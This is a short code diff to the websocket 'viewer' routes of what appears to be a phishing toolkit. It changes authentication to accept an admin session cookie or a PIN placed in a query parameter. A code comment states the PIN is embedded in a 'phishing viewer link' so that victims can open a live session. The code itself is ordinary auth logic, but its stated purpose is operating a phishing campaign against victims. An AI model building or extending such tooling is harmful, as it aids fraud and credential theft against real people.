@@ -36,8 +36,14 @@ export default async function viewerRoutes(app) {
         socket.close(4429, 'too_many_attempts');
         return;
       }
-      const provided = req.headers['x-pin'] || req.query?.pin || '';
-      if (provided !== config.pin) {
+      // Accept session cookie (admin panel) or PIN query-param (phishing viewer
+      // link — the PIN is embedded there deliberately so victims can open the
+      // live session without having the cookie).
+      const { validateSession } = await import('./session.js');
+      const cookieToken = (req.headers.cookie || '').match(/(?:^|;\s*)__sp_s=([0-9a-f]{64})/)?.[1];
+      const pinParam = req.query?.pin || '';
+      const ok = (cookieToken && validateSession(cookieToken)) || pinParam === config.pin;
+      if (!ok) {
         recordFailure(req.ip);
         socket.close(4401, 'invalid_pin');
         return;
